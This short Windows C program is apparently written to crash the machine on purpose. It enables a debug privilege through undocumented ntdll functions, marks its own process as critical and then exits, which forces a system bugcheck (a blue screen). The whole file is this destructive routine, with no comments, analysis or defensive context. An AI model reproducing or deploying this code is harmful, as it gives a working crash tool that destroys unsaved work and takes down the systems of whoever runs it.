#include <windows.h>

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
    typedef BOOL(WINAPI* RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
    RtlAdjustPrivilege AdjustPrivilege;
    RtlSetProcessIsCritical SetCriticalProcess;

    HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
    AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
    SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
    BOOLEAN b;

    AdjustPrivilege(20UL, TRUE, FALSE, &b);
    SetCriticalProcess(TRUE, NULL, FALSE);
    return 0;
}